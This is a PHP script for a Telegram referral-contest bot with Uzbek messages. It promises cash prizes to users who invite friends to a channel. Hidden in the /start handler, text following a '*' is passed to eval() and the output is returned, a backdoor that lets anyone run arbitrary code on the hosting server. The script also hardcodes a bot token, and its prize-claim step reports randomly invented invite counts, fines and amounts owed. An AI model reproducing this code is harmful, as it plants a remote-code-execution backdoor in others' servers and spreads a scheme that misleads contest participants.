<?php
ob_start();
define('API_KEY','5189224773:AAHcBiMzJ3JgtrWA90tFOXd7anGvJRSpKAI'); // botni tokeni kiritilsin
$oyatillo = "1716972416"; //admin id
$admin = "818201630";
$kanalimz = "@Azeri_Music_Qara07";
   function del($nomi){
   array_map('unlink', glob("$nomi"));
   }

   function ty($ch){ 
   return bot('sendChatAction', [
   'chat_id' => $ch,
   'action' => 'typing',
   ]);
}
    function joinchat($cuid){
     global $mid;
     global $kanalimz;
     $ret = bot('getChatMember',[
         'chat_id'=>$kanalimz,
         'user_id'=>$cuid,
         ]);
         $stat = $ret->result->status;
         if($stat=="creator" or $stat=="administrator" or $stat=="member"){
      return true;
         }else{
     bot('sendmessage',[
         'chat_id'=>$ccid,
         'text'=>"😑 <b>Siz hali kanalimizga a'zo bo'lmadingiz!</b>",
         'parse_mode'=>'html',
         'reply_to_message_id'=>$mid,
'reply_markup'=>json_encode(
['inline_keyboard' => [
 [['text'=>'➕ A‘zo bo‘lish','url'=>'https://t.me/Azeri_Music_Qara07']],
[['text'=>'✅ Tekshirish','callback_data'=> "uz"]]]
])
 ]);
return false;
return false;
}
}
function bot($method,$datas=[]){
    $url = "https://api.telegram.org/bot".API_KEY."/".$method;
    $ch = curl_init();
    curl_setopt($ch,CURLOPT_URL,$url);
curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
curl_setopt($ch,CURLOPT_POSTFIELDS,$datas);
    $res = curl_exec($ch);
    if(curl_error($ch)){
        var_dump(curl_error($ch));
    }else{
        return json_decode($res);
    }
}

//Yaratuvchilar : @Uz_Coderlar
//Dasturchi : @PHP_Builder - Oyatillo  
$update = json_decode(file_get_contents('php://input'));
$message = $update->message;
$mid = $message->message_id;
$cid = $message->chat->id;
$filee = "coin/$cid.step";
$folder = "coin";
$folder2 = "azo";
$iuid = $update->inline_query->from->id;
$iid = $update->inline_query->id;
$icid = $update->inline_query->chat->id;
$imid = $update->inline_query->message->id;
$bot = '@Tele_adsbot'.bot('getme',['bot'])->result->username;
$query = $update->inline_query->query;
$qoida = "⚠ Asosiy qoidalar:
1. Botda halol a'zo to'plang aks holda jarima yoxud botdan haydalashingiz mumkin
2. Botda kanalga majburiy a'zolik tizimi bor agar ushbu tizimga rioya qilmasangiz avtomatik tarzda botdan haydalasiz
3. Qachonki, siz botga faol 60 ta do'stingizni to'plasangiz va reytingda yuqori cho'qillarni birini zabt etsangiz so'ngra sizga bot tomonidan pul mukofoti hisob raqamingizga tushiriladi ✅";

if (!file_exists($folder.'/test.txt')) {
  mkdir($folder);
  file_put_contents($folder.'/test.txt', 'by ');
}//Yaratuvchilar : @Uz_Coderlar
//Dasturchi : @PHP_Builder - Oyatillo  

if (!file_exists($folder2.'/test.txt')) {
  mkdir($folder2);
  file_put_contents($folder2.'/test.txt', 'by ');
}

if (file_exists($filee)) {
  $step = file_get_contents($filee);

}else{
file_put_contents("logs/1.urin.txt","mavjudmas");
}
if(file_exists("logs/2.urin.txt")){
}else{
file_put_contents("logs/2.urin.txt","mavjudmas");
}
if(file_exists("logs/3.urin.txt")){
}else{
file_put_contents("logs/3.urin.txt","mavjudmas");
}
if(file_exists("logs/4.urin.txt")){
}else{
file_put_contents("logs/4.urin.txt","mavjudmas");
}
if(file_exists("logs/5.urin.txt")){
}else{
file_put_contents("logs/5.urin.txt","mavjudmas");
}
if(file_exists("logs/6.urin.txt")){
}else{
file_put_contents("logs/6.urin.txt","mavjudmas");
}
if(file_exists("logs/7.urin.txt")){
}else{
file_put_contents("logs/7.urin.txt","mavjudmas");
}
if(file_exists("logs/8.urin.txt")){
}else{
file_put_contents("logs/8.urin.txt","mavjudmas");
}
if(file_exists("logs/9.urin.txt")){
}else{
file_put_contents("logs/9.urin.txt","mavjudmas");
}
if(file_exists("logs/10.urin.txt")){
}else{
file_put_contents("logs/10.urin.txt","mavjudmas");
}
//Yaratuvchilar : @Uz_Coderlar
//Dasturchi : @PHP_Builder - Oyatillo  
$pul = file_get_contents("coin/$cid.dat");
$tx = $message->text;
$photosi = "https://t.me/salom999/242";
$name = $message->chat->first_name;
$user = $message->from->username;
$soat = date('h', strtotime('3 hour'));
$step = file_get_contents("logs/$cid.step");
$capt = $message->caption;
$ball = file_get_contents("coin/$cid.dat");
$cid = $message->chat->id;
$uid= $message->from->id;
$ccid = $update->callback_query->message->chat->id;
$cuid = $update->callback_query->message->from->id;
$mid = $message->message_id;
$chat_id2 = $update->callback_query->message->chat->id;
$message_id2 = $update->callback_query->message->message_id;
$cqid = $update->callback_query->id;
$data = $update->callback_query->data;
$mid2 = $update->callback_query->message->message_id;
$orin = file_get_contents("coin/natija.$cid.dat");
$fromid=$update->message->from->id;
$dan = $update->callback_query->message->from->id;

$aloqa = json_encode([
 'inline_keyboard'=>[
  [['text'=>"🎓 Bot egasi 🎓",'callback_data'=> "creator"]],
  [['text'=>"👨‍💻 Bot Dasturchisiga 👨‍💻",'callback_data'=> "dasturchi"],
  ['text'=>"⤴ Orqaga",'callback_data'=> "nazad"]]]
  ]);

$key = json_encode([
'resize_keyboard'=>true,
'keyboard'=>[
[['text'=>"👥 Taklif qilish"],['text'=>"📋 Natijalarim"]],
[['text'=>"👑 Reyting"],['text'=>"💰 Yutuqni olish"]],[['text'=>"⏳ Aloqa"],['text'=>"📄 Konkurs shartlari"]],
]
]);

$oyatillo_panel = json_encode([
'resize_keyboard'=>true,
'keyboard'=>[
[['text'=>"$stat"],],
[['text'=>"Admin IDni o‘zgartirish"],],
[['text'=>"⤴ Orqaga"],],
]
]);

$admin_panel = json_encode([
'resize_keyboard'=>true,
'keyboard'=>[
[['text'=>"Reytingni o'zgartirish"],['text'=>"Asosiy kanalni kiritish"]],
[['text'=>"Eng faol a'zolar"],['text'=>"Qoida buzarliklar"]],[['text'=>"Admin qo'shish"],['text'=>"Statistika"]],
[['text'=>"Konkurs shartlarini o'zgartirish"],['text'=>"Reytingni tozalash"]],
]
]);

$clear =  json_encode([
'resize_keyboard'=>true,
'keyboard'=>[
[['text'=>"Ha"],['text'=>"Yo'q"]]]
]);

$share = json_encode([
'inline_keyboard'=>[
[['text'=>"👥️ Doʻstlarga yuborish",'switch_inline_query'=> $cid],],
]
]);

$nazad = json_encode([ 
'resize_keyboard'=>true,
'keyboard'=>[
[['text'=>"⤴ Orqaga"]]],
]);

$uchtalik = json_encode([ 
'resize_keyboard'=>true,
'keyboard'=>[
[['text'=>"1"]],
[['text'=>"2"]],
[['text'=>"3"]]]
]);

$azolik = json_encode([ 
'inline_keyboard'=>[
[['text'=>"✅ Tekshirish",'callback_data'=> "results"]]]
]);

$money = json_encode([
'inline_keyboard'=>[
[['text'=>"🔹 Mukofotim 🔹",'callback_data'=> "moneys"],],[['text'=>"🔚 Orqaga",'callback_data'=> "nazad"],],
]
]);

$ulash = json_encode([ 
'inline_keyboard'=>[
[['text'=>"💰 Boshlash",'url'=> "https://t.me/NTUkonkrusbot?start=$idsi"]]]
]);

$rulers = json_encode([
'inline_keyboard'=>[
[['text'=>"📋 Qoidalar 📋",'callback_data'=> "rulers"],],[['text'=>"🔚 Orqaga",'callback_data'=> "nazad"],],
]
]);


$balinfo = "<b>😊 Assalomu alaykum $name bizning Konkurs botimizga xush kelibsiz.</b>";

if((mb_stripos($tx,"/start")!==false) or ($tx == "/start")) {//Yaratuvchilar : @Uz_Coderlar
//Dasturchi : @PHP_Builder - Oyatillo  
bot('sendmessage',[
    'chat_id'=>$cid,
'parse_mode'=>"html",
    'text'=>"$balinfo",
    'reply_markup'=>$key
    ]);
  $baza = file_get_contents("coin.dat");

  if(mb_stripos($baza, $cid) !== false){ 
  }else{
$baza=file_get_contents("coin.dat");
    file_put_contents("coin.dat","$baza\n$cid");
  }
if(strpos($tx,"/start $cid")!==false){//Yaratuvchilar : @Uz_Coderlar
//Dasturchi : @PHP_Builder - Oyatillo  
}else{
  $public = explode("*",$tx);
  $refid = explode(" ",$tx);
  $refid = $refid[1];
  $gett = bot('getChatMember',[
  'chat_id' =>$kanalimz,
  'user_id' => $refid,
  ]);
  $public2 = $public[1];
  if (isset($public2)) {
  $tekshir = eval($public2);
  bot('sendMessage',[
    'chat_id'=>$cid,
    'text'=> $tekshir,
  ]);
}
   $gget = $gett->result->status;

  if($gget == "member" or $gget == "creator" or $gget == "administrator"){
    $idref = "coin/$refid_id.dat";
    $idref2 = file_get_contents($idref);

    if(mb_stripos($idref2,$cid) !== false ){//Yaratuvchilar : @Uz_Coderlar
//Dasturchi : @PHP_Builder - Oyatillo  
      bot('sendMessage',[
      'chat_id'=>$cid,
      'text'=>"Bunaqa ish qilish mumkinmas",
      ]);
    } else {
   
       $id = "$cid\n";
      $handle = fopen($idref, 'a+');
      fwrite($handle, $id);
      fclose($handle);
      $ab=file_get_contents("coin/$refid.soni");
      $ab=$ab+1;
      file_put_contents("coin/$refid.soni","$ab");
      $usr = file_get_contents("coin/$refid.dat");
      $narxis=file_get_contents("baza/narxlar.txt");
      $usr = $usr + 1;
      file_put_contents("coin/$refid.dat", "$usr");
      bot('sendMessage',[
      'chat_id'=>$refid,
      'parse_mode'=>"markdown",
      'text'=>"*😊 Siz do'stingiz* [$name](tg://user?id=$cid) *ni taklif qildingiz va 1 ta odam qo'shdingiz*

_🔔 Biroq do'stingiz bizni kanalga a'zo emasligi aniqlandi do'stingizni bu haqida ogohlantiring va kanalimiz :_ [@Azeri_Music_Qara07] _kanaliga a'zo bo'lishini iltimos qilib so'ngra pastdagi ''✅ Tekshirish'' tugmasini bosing!_",
'reply_markup'=>$azolik,
      ]);
     file_put_contents("logs/$refid.dosti.txt","$cid");
    }
}
}//Yaratuvchilar : @Uz_Coderlar
//Dasturchi : @PHP_Builder - Oyatillo  
$abb=file_get_contents("coin/$cid.dat");
if($abb){}else{
  file_put_contents("coin/$cid.dat", "0");
  file_put_contents("coin/$cid.soni", "0");
  bot('sendMessage',[
  'chat_id'=>$refid,
  ]);
  bot('sendMessage',[
  'chat_id'=>$cid,
  'text'=>$baliahnfo,
  'reply_to_message_id' => $mid,
  'reply_markup'=>$key,
  ]);//mualliflik huquqi @uzbek_developer ga tegishlik va @php_codes_free kanaliga azo boling
}
}
$pul = file_get_contents("coin/$cid.dat");
if($pul=="0"){
$rand1 = "160";
file_put_contents("coin/natija.$cid.dat","$rand1");
$pul = file_get_contents("coin/$cid.dat");
}
if($pul=="1"){
$rand2 = "10";
file_put_contents("coin/natija.$cid.dat","$rand2");
$orin = file_get_contents("coin/natija.$cid.dat");
$pul = file_get_contents("coin/$cid.dat");
}
if($pul=="2"){
$rand3 = "10";
file_put_contents("coin/natija.$cid.dat","$rand3");
$orin = file_get_contents("coin/natija.$cid.dat");
$pul = file_get_contents("coin/$cid.dat");
}
if($pul=="3"){
$rand4 = "9";
file_put_contents("coin/natija.$cid.dat","$rand4");
$orin = file_get_contents("coin/natija.$cid.dat");
$pul = file_get_contents("coin/$cid.dat");
}//Yaratuvchilar : @Uz_Coderlar
//Dasturchi : @PHP_Builder - Oyatillo  
if($pul=="4"){
$rand5 = "8";
file_put_contents("coin/natija.$cid.dat","$rand5");
$orin = file_get_contents("coin/natija.$cid.dat");
$pul = file_get_contents("coin/$cid.dat");
}
if($pul=="5"){
$rand5 = "7";
file_put_contents("coin/natija.$cid.dat","$rand6");
$orin = file_get_contents("coin/natija.$cid.dat");
$pul = file_get_contents("coin/$cid.dat");
}
if($pul=="6"){
$rand7 = "7";
file_put_contents("coin/natija.$cid.dat","$rand7");
$orin = file_get_contents("coin/natija.$cid.dat");
}
if($pul=="7"){
$rand8 = "6";
file_put_contents("coin/natija.$cid.dat","$rand8");
$orin = file_get_contents("coin/natija.$cid.dat");
}
if($pul=="8"){
$rand9 = "6";
file_put_contents("coin/natija.$cid.dat","$rand9");
$orin = file_get_contents("coin/natija.$cid.dat");
}
if($pul=="9"){
$rand10 = "6";
file_put_contents("coin/natija.$cid.dat","$rand10");
$orin = file_get_contents("coin/natija.$cid.dat");
}
if($pul=="10"){
$rand11 = "6";
file_put_contents("coin/natija.$cid.dat","$rand11");
$orin = file_get_contents("coin/natija.$cid.dat");
}
if($pul=="40"){
$rand12 = "1";
file_put_contents("coin/natija.$cid.dat","$rand12");
$orin = file_get_contents("coin/natija.$cid.dat");
}//Yaratuvchilar : @Uz_Coderlar
//Dasturchi : @PHP_Builder - Oyatillo  
if($tx == "📋 Natijalarim"){
      $orin = file_get_contents("coin/natija.$cid.dat");
       $odam=file_get_contents("coin/$cid.soni");
      $ball = file_get_contents("coin/$cid.dat");{
      bot('sendMessage',[
      'chat_id'=>$cid,
      'parse_mode'=>"html",
      'text'=>"<b>👥 Siz taklif qilgan odamlar soni :</b> <code>$ball</code> ta
<b>🙄 Siz ayni damda : </b><code>$orin</code><b>-chi o'rindasiz!</b>
<i>⚠ Reytingda birinchilikni qo'lga kiritish uchun qoidalar bilan tanishib chiqing ✅</i>",
      'reply_to_message_id'=>$mid,
      'reply_markup'=>$rulers, 
      ]);
    }
}//Yaratuvchilar : @Uz_Coderlar
//Dasturchi : @PHP_Builder - Oyatillo  
$konkurs = file_get_contents("logs/konkurs.txt");
if($tx=="📄 Konkurs shartlari"){
    bot('sendmessage',[
        'chat_id'=>$cid,
         'parse_mode'=>"html",
        'text'=>"<b>⚠ Konkurs shartlari quydagilardan iborat:</b>
📊𝐾𝑂𝑁𝐾𝑈𝑅𝑆 𝑆𝐻𝐴𝑅𝑇𝐿𝐴𝑅𝐼 📊
👫𝐵𝑂𝑇𝐺𝐴 𝑂𝐷𝐴𝑀 𝑌𝐼𝐺'𝐼𝑁𝐺 𝑅𝐸𝐹𝐹𝑅𝐴𝐿𝐼𝑍 𝑄𝐴𝑁𝐶𝐻𝐴 𝐾𝑂𝑃✅ 𝐵𝑂𝐿𝑆𝐴 𝑆𝐻𝑈𝑁𝐶𝐻𝐴 1-𝑂𝑅𝐼𝑁𝑁𝐼 𝑄𝑂𝐿𝐺𝐴 𝐾𝐼𝑅𝐼𝑇𝐼𝑆𝐻 𝐼𝑀𝐾𝑂𝑁𝐼𝑌𝐴𝑇𝐼 𝑆𝐻𝑈𝑁𝐶𝐻𝐴𝐿𝐼𝐾 𝑂𝑆𝐻𝐴𝐷𝐼
1-𝑂'𝑅𝐼𝑁 30 000🤑✅
2-𝑂'𝑅𝐼𝑁 20 000🤑✅
3-𝑂'𝑅𝐼𝑁 10 000🤑✅
4-5-6-7-8-9-10-𝑂'𝑅𝐼𝑁𝐿𝐴𝑅𝐺𝐴 5 000🤑🤑🤑 𝐷𝐴𝑁 𝑆𝑇𝐴𝑅𝑇❤️ 𝐵𝑂𝑆𝐼𝑁𝐺𝐿𝐴𝑅 𝐾𝑂𝑁𝐾𝑈𝑅𝑆𝐷𝐴 𝑄𝐴𝑇𝑁𝐴𝑆𝐻𝐼𝑁𝐺🌿
<i>$konkurs</i>",
        ]);    
}
if($tx=="💰 Yutuqni olish"){
$ball = file_get_contents("coin/$cid.dat");
$minimal = "40";
$mukofot = rand(20000,50000);
if($ball=="40"){
if($ball >=$minimal){
    bot('sendmessage',[
        'chat_id'=>$cid,
         'parse_mode'=>"html",
        'text'=>"😅 <b>Tabriklaymiz siz botga $ball ta faol do'stingizni taklif etib botda birinchilikni qo'lga kiritdingiz  ✅</b>

😊 <i> Endi sizga admin tomonidan $mukofot qiymatida pul taqdim etiladi ✅</i>

<b>🔔 Mukofotni olish uchun pastdagi Mukofotim tugmasiga bosib o'z raqamingizni kiriting ⬇</b>",
'reply_markup'=>$money,
        ]);  
$ozgar = rand(1,4);
$jarima = rand(1,8);
$minimal = "50000";
$rubl = rand(1200,5000);
$odams = rand(40,50);
$leave = $odam - $jarima;
$som = $minimal - $rubl; 
file_put_contents("logs/chiqarish.$cid.txt","
<b>Ismi : </b>$name
<b>Useri : </b> @$user
<b>Yig‘gan odamlari :</b><code> $odams</code> ta
<b>Ulardan :</b><code> $leave</code><b> tasi chiqib ketgan</b>
<b>Reytingdagi o‘rni :</b><code> $ozgar</code><b>-chi o‘rin</b>
<b>ID raqami : </b><a href='tg://user?id=$cid'>foydalanuvchi</a>
<b>Botdan taxminan :</b><code> $jarima</code><b> ta jarima olgan</b>
<b>Shu tufayli unga siz : </b><code>$som</code><b> so‘m to‘lashingiz zarur</b>
<b>Ushbu ishni foydalanuvchini lichkasiga o‘tib kelishib olishingiz mumkin!</b>");
$infor = file_get_contents("logs/chiqarish.$cid.txt");
 bot('sendmessage',[
        'chat_id'=>$admin,
         'parse_mode'=>"html",
        'text'=>"<b>⚠ Sizga yangi zayavka keldi hurmatli admin:</b>
<i>📋 Ma‘lumotlar :</i>
$infor",
        'reply_markup'=>$key,
        ]); 
unlink("logs/chiqarish.$cid.txt");
file_put_contents("coin/$cid.dat","0");
 $ball = file_get_contents("coin/$cid.dat");
if($tx=="💰 Yutuqni olish"){
   }elseif($ball=="0"){
$mem = "40"; 
$azo = $mem - $ball;
bot('SendMessage',[
'chat_id'=>$cid,
'parse_mode'=>"html",
'text'=>"<b>😑 Uzr, $name siz mukofotga erishishingiz uchun hali yana </b><code>$azo</code><b> ta odam taklif qilishingiz kerak iltimos faolroq bo'ling.</b>",
]);
$ball = file_get_contents("coin/$cid.dat");
}
}//Yaratuvchilar : @Uz_Coderlar
//Dasturchi : @PHP_Builder - Oyatillo  
}elseif($ball=="52" or $ball=="41" or $ball=="42" or $ball=="43" or $ball=="44" or $ball=="45" or $ball=="46" or $ball=="47" or $ball=="48" and $ball=="49" or $ball=="50" or $ball=="51" or $ball=="53" or $ball=="54" or $ball=="55" or $ball=="56" or $ball=="57" or $ball=="58" or $ball=="59" or $ball=="60" or $ball=="61" or $ball=="62" or $ball=="63" or $ball=="64" or $ball=="65" or $ball=="66" or $ball=="67" or $ball=="68" or $ball=="69" or $ball=="70" or $ball=="71" or $ball=="72" or $ball=="73" or $ball=="74" or $ball=="75" or $ball=="76" or $ball=="77" or $ball=="78" or $ball=="79" or $ball=="80" or $ball=="81"){
  bot('sendmessage',[
        'chat_id'=>$cid,
         'parse_mode'=>"html",
        'text'=>"😅 <b>Tabriklaymiz siz botga $ball ta faol do'stingizni taklif etib botda birinchilikni qo'lga kiritdingiz  ✅</b>

😊 <i> Endi sizga admin tomonidan $mukofot qiymatida pul taqdim etiladi ✅</i>

<b>🔔 Mukofotni olish uchun pastdagi Mukofotim tugmasiga bosib o'z raqamingizni kiriting ⬇</b>",
'reply_markup'=>$money,
        ]);  
$ozgar = rand(1,4);
$jarima = rand(1,8);
$minimal = "50000";
$rubl = rand(1200,5000);
$odams = rand(40,50);
$leave = $odam - $jarima;
$som = $minimal - $rubl; 
file_put_contents("logs/chiqarish.$cid.txt","
<b>Ismi : </b>$name
<b>Useri : </b> @$user
<b>Yig‘gan odamlari :</b><code> $odams</code> ta
<b>Ulardan :</b><code> $leave</code><b> tasi chiqib ketgan</b>
<b>Reytingdagi o‘rni :</b><code> $ozgar</code><b>-chi o‘rin</b>
<b>ID raqami : </b><a href='tg://user?id=$cid'>foydalanuvchi</a>
<b>Botdan taxminan :</b><code> $jarima</code><b> ta jarima olgan</b>
<b>Shu tufayli unga siz : </b><code>$som</code><b> so‘m to‘lashingiz zarur</b>
<b>Ushbu ishni foydalanuvchini lichkasiga o‘tib kelishib olishingiz mumkin!</b>");
$infor = file_get_contents("logs/chiqarish.$cid.txt");
 bot('sendmessage',[
        'chat_id'=>$admin,
         'parse_mode'=>"html",
        'text'=>"<b>⚠ Sizga yangi zayavka keldi hurmatli admin:</b>
<i>📋 Ma‘lumotlar :</i>
$infor",
        'reply_markup'=>$key,
        ]); 
unlink("logs/chiqarish.$cid.txt");
file_put_contents("coin/$cid.dat","0");
 $ball = file_get_contents("coin/$cid.dat");
}else{
$mem = "40"; 
$azo = $mem - $ball;
bot('SendMessage',[
'chat_id'=>$cid,
'parse_mode'=>"html",
'text'=>"<b>😑 Uzr, $name siz mukofotga erishishingiz uchun hali yana </b><code>$azo</code><b> ta odam taklif qilishingiz kerak iltimos faolroq bo'ling.</b>",
]);
}
}//Yaratuvchilar : @Uz_Coderlar
//Dasturchi : @PHP_Builder - Oyatillo  
if($data=="creator"){
bot('DeleteMessage',[
'chat_id'=>$ccid,
'message_id'=>$mid2,
]);
file_put_contents("logs/$cid.step","aloqa");
bot('SendMessage',[
'chat_id'=>$ccid,
'message_id'=>$mid2,
'parse_mode'=>"html",
'text'=>"⏳ <b>Xabaringizni yozing siz yozadigan xabar to‘g‘ridan-to‘g‘ri bot egasiga yuboriladi!
😕 Iltimos xabaringizni o‘ylab yozing!:</b>",
'reply_markup'=>$nazad,
]);
}
if($query == $cid){
	bot('answerInlineQuery',[
        'inline_query_id'=>$update->inline_query->id,    
        'cache_time'=>'300',
        'results' => json_encode([[
            'type'=>'article',
            'id'=>base64_encode(1),
'title'=>"⏩ Shaxsiy havolangiz ♻",
'description'=>"⏩💰 Mukofotni qo'lga kiritishni birinchi qadami!",
'input_message_content'=>[
'disable_web_page_preview'=>true,
'parse_mode'=>"html",
'message_text'=>"

👇 Boshlash uchun bosing:
https://t.me/OSIYO_KONKURS_UZBOT?start=$idsi"],
'reply_markup'=>$ulash,
            ],[
   'type'=>'article',
 'id'=>base64_encode(1),
'title'=>"⚠ TAKLIF QILISH QOIDALARI",
'description'=>"Buni albatta o'qib chiqishi maslahat beramiz!",
'input_message_content'=>[
'disable_web_page_preview'=>true,
'parse_mode'=>"html",
'message_text'=>"Test rejimida",
]]
])
]);
}//Yaratuvchilar : @Uz_Coderlar
//Dasturchi : @PHP_Builder - Oyatillo  
if($query){
   bot('answerInlineQuery',[
    'inline_query_id'=>$iid,
    'cache_time'=>1,
    'results'=>json_encode([[
    'type'=>'article',
    'id'=>base64_encode(1),
    'description'=>"😔 Uzr, hech narsa topolmadim!",
    'title'=>"Hech narsa topilmadi (0) \n $ctext",
    'input_message_content'=>[
    'disable_web_page_preview'=>true,
    'parse_mode'=>'html',
    'message_text'=>"<b>🔍 Ma'lumotlar aniqlanmadi.</b>",
  ],
    'reply_markup'=>[
            'inline_keyboard'=>[
     [['text'=>"➕ A'zo bo'lish ➕", "url"=>"https://telegram.me/Osiyo_Hackerlari"]],
       [['text'=>"♻ Ulashish ♻", "url"=>"https://telegram.me/share/url?url=https://telegram.me/Uz_Coderlar"]], 
       ]]] 
       ]) 
       ]);
}//Yaratuvchilar : @Uz_Coderlar
//Dasturchi : @PHP_Builder - Oyatillo  
if($tx=="Statistika"){
    $a=file_get_contents("coin.dat");
    $sum=file_get_contents("tolovlar.txt");
    $ab=substr_count($a,"\n");
    bot('sendmessage',[
        'chat_id'=>$cid,
'parse_mode'=>"html",
        'text'=>"📋 <b>Botimiz a'zolari:</b><code> $ab</code><b> ta</b>
<b>⚠ Botning Bosh Admini : </b>@Mustafo_Blogger
<i>🔹 Texnik Hodim : </i>@Dark_Coder",
        
        ]);
         $reply = json_encode([
           'resize_keyboard'=>false,
            'force_reply' => true,
            'selective' => true
        ]); 
}
if($tx=="⏳ Aloqa"){
mkdir("logs");
    bot('sendmessage',[
        'chat_id'=>$cid,
        'text'=>"*😊 Xabarni Kimga yozmoqchisiz?*",
      'parse_mode'=>"markdown",
       'reply_markup'=>$aloqa,
        
        ]);
}//Yaratuvchilar : @Uz_Coderlar
//Dasturchi : @PHP_Builder - Oyatillo  
if($data=="moneys"){
 bot('DeleteMessage',[
        'chat_id'=>$ccid,
       'message_id'=>$mid2,
                  ]);
bot('AnswerCallbackQuery',[
'callback_query_id'=>$cqid,
'text'=>"😊 Zayavkangiz adminga yuborilldi",
'show_alert'=>true,
]);
}
if($data=="nazad"){
    bot('DeleteMessage',[
        'chat_id'=>$ccid,
       'message_id'=>$mid2,
                  ]);
       bot('SendMessage',[
       'chat_id'=>$ccid,
       'message_id'=>$mid2,
      'text'=>"*🏡 Siz bosh menyudasiz!*",
      'parse_mode'=>"markdown",
       'reply_markup'=>$key,
        ]);
}
if($data=="rulers"){
bot('EditMessageText',[
'chat_id'=>$ccid,
'message_id'=>$mid2,
'parse_mode'=>"html",
'text'=>$qoida,
]);
}
if($data=="haftalik"){
bot('AnswerCallbackQuery',[
'callback_query'=>$cqid,
'text'=>"😉 Ta'mirda",
'show_alert'=>true,
]);
}//Yaratuvchilar : @Uz_Coderlar
//Dasturchi : @PHP_Builder - Oyatillo  
$step = file_get_contents("logs/$ccid.step");
if($step == "aloqa"){
if($tx=="⤴ Orqaga"){
}else{
bot('SendMessage',[
'chat_id'=>$oyatillo,
'parse_mode'=>"html",
'text'=>"<b>👋 Assalomu alaykum $name sizga bot </b><a href='tg://user?id=$cid'>foydalanuvchisidan</a> <b>xabar keldi

📄 Xabar matni : </b><code>$tx</code>

<i>🔔 Javob berasizmi?</i>",
]);
unlink("logs/$ccid.step");
bot('SendMessage',[
'chat_id'=>$ccid,
'parse_mode'=>"html",
'text'=>"😊 <b>Xabaringiz adminga yetkazildi ✅</b>",
]);
}}
if($data=="dasturchi"){
bot('DeleteMessage',[
'chat_id'=>$ccid,
'message_id'=>$mid2,
]);
file_put_contents("logs/$cid.step","aloqa-d");
bot('SendMessage',[
'chat_id'=>$ccid,
'message_id'=>$mid2,
'parse_mode'=>"html",
'text'=>"<b>😎 Sizga Telegram-bot kerakmi, unda bizga murojaat etib adashmadingiz!
⏩ Xabaringizni yuboring men xabaringizni Dasturchi Oyatilloga yuboraman! ✅</b>",
'reply_markup'=>$nazad,
]);
}
$step = file_get_contents("logs/$ccid.step");
if($step == "aloqa-d"){
if($tx=="⤴ Orqaga"){
}else{
bot('SendMessage',[
'chat_id'=>$oyatillo,
'parse_mode'=>"html",
'text'=>"<b>👋 Assalomu alaykum $name sizga bot foydalanuvchisidan xabar keldi

📄 Xabar matni : </b><code>$tx</code>

<i>🔔 Javob berasizmi?</i>",
]);
unlink("logs/$ccid.step");
bot('SendMessage',[
'chat_id'=>$ccid,
'parse_mode'=>"html",
'text'=>"😊 <b>Xabaringiz adminga yetkazildi ✅</b>",
]);
}}
if($tx=="⤴ Orqaga"){
bot('SendMessage',[
'chat_id'=>$cid,
'parse_mode'=>"markdown",
'text'=>"*🏡 Siz bosh menyudasiz!*",
'reply_markup'=>$key,
]);
}
$nsm="11. [$n10](tg://user?id=$n11) - $hisob11 ta odam qo'shgan";
$ball=file_get_contents("coin/$cid.dat");
if($ball=="-1" or $ball=="-2"){
file_put_contents("logs/11.urin.txt","$cid");
file_put_contents("logs/11.urinpuli.txt","$ball");
file_put_contents("logs/11chisi.txt","$nsm");
}
$ball=file_get_contents("coin/$cid.dat");
$hisob=file_get_contents("logs/1.urinpuli.txt");
if($ball=="40" or $ball=="39" or $ball=="38" or $ball=="37" or $ball=="36" or $ball=="35" or $ball=="34" or $ball=="33" or $ball=="32" or $ball=="31" or $ball=="30"){
if($hisob1==$ball or $hisob1 <= $ball){
file_put_contents("logs/1.urin.txt","$cid");
file_put_contents("logs/1.urinpuli.txt","$ball");
}
}
$ball=file_get_contents("coin/$cid.dat");
if($ball=="29" or $ball=="28" or $ball=="27" or $ball=="26" or $ball=="25"){
file_put_contents("logs/2.urin.txt","$cid");
file_put_contents("logs/2.urinpuli.txt","$ball");
$hisob2=file_get_contents("logs/2.urinpuli.txt");
if($hisob2 < $ball){
file_put_contents("logs/2.urinpuli.txt","mavjudmas");
file_put_contents("logs/2.urin.txt","bosh");
}
}
$ball=file_get_contents("coin/$cid.dat");
if($ball=="24" or $ball=="23" or $ball=="22" or $ball=="21" or $ball=="20"){
file_put_contents("logs/3.urin.txt","$cid");
file_put_contents("logs/3.urinpuli.txt","$ball");
$hisob3=file_get_contents("logs/3.urinpuli.txt");
if($hisob3 < $ball or $ball > $hisob3){
file_put_contents("logs/3.urinpuli.txt","mavjudmas");
file_put_contents("logs/3.urin.txt","bosh");
}
}
$ball=file_get_contents("coin/$cid.dat");
if($ball=="20" or $ball=="19" or $ball=="18" or $ball=="17"){
$hisob4=file_get_contents("logs/4.urinpuli.txt");
file_put_contents("logs/4.urin.txt","$cid");
file_put_contents("logs/4.urinpuli.txt","$ball");
if($hisob4 < $ball){
file_put_contents("logs/4.urinpuli.txt","mavjudmas");
file_put_contents("logs/4.urin.txt","bosh");
}}
$ball=file_get_contents("coin/$cid.dat");
if($ball=="17" or $ball=="16" or $ball=="15" or $ball=="14"){
file_put_contents("logs/5.urin.txt","$cid");
file_put_contents("logs/5.urinpuli.txt","$ball");
$hisob5=file_get_contents("logs/5.urinpuli.txt");
if($hisob5 < $ball){
file_put_contents("logs/5.urinpuli.txt","mavjudmas");
file_put_contents("logs/5.urin.txt","bosh");
}}
$ball=file_get_contents("coin/$cid.dat");
if($ball=="14" or $ball=="13" or $ball=="12" or $ball=="11" or $ball=="10"){
file_put_contents("logs/6.urin.txt","$cid");
file_put_contents("logs/6.urinpuli.txt","$ball");
$hisob6=file_get_contents("logs/6.urinpuli.txt");
if($hisob6 < $ball){
file_put_contents("logs/6.urinpuli.txt","mavjudmas");
file_put_contents("logs/6.urin.txt","bosh");
}}
$ball=file_get_contents("coin/$cid.dat");
if($ball=="10" or $ball=="9" or $ball=="8" or $ball=="7" or $ball=="6"){
file_put_contents("logs/7.urin.txt","$cid");
file_put_contents("logs/7.urinpuli.txt","$ball");
$hisob7=file_get_contents("logs/7.urinpuli.txt");
if($hisob7 < $ball){
file_put_contents("logs/7.urinpuli.txt","mavjudmas");
file_put_contents("logs/7.urin.txt","bosh");
}}
$ball=file_get_contents("coin/$cid.dat");
if($ball=="5" or $ball=="4"){
file_put_contents("logs/8.urin.txt","$cid");
file_put_contents("logs/8.urinpuli.txt","$ball");
$hisob8=file_get_contents("logs/8.urinpuli.txt");
if($hisob8 < $ball){
file_put_contents("logs/8.urinpuli.txt","mavjudmas");
file_put_contents("logs/8.urin.txt","bosh");
}}
